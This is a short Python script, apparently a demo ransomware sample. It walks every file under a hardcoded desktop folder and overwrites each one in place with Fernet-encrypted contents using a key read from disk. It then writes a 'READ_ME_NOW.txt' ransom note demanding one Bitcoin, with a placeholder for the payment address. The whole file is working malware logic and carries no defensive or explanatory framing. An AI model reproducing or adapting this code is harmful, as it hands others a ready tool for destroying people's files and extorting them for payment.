from cryptography.fernet import Fernet
import os

def main():
    key = ""

    # read the key
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
  
    # using the generated key
    fernet = Fernet(key)

    # starting path
    path = "/Users/spency/Desktop/demo"

    # iterate through dictories starting with the path given
    for root, dirs, files in os.walk(path, topdown=False):
        for name in files:
            print(os.path.join(root, name))
            # opening the original file to encrypt
            with open(os.path.join(root, name), 'rb') as file:
                original = file.read()
            # encrypting the file
            encrypted = fernet.encrypt(original)
            # opening the file in write mode and 
            # writing the encrypted data
            with open(os.path.join(root, name), 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
    
    # create ransom note
    note = open("READ_ME_NOW.txt", "w")
    bitcoin_address = "<ENETR YOUR PUBLIC BITCOIN ADDRESS HERE>"
    note.write("The current file path has been encrypted, send 1 Bitcoin to the following address to receive to decryption key: {}".format(bitcoin_address))
    note.close()

if __name__=="__main__":
    main()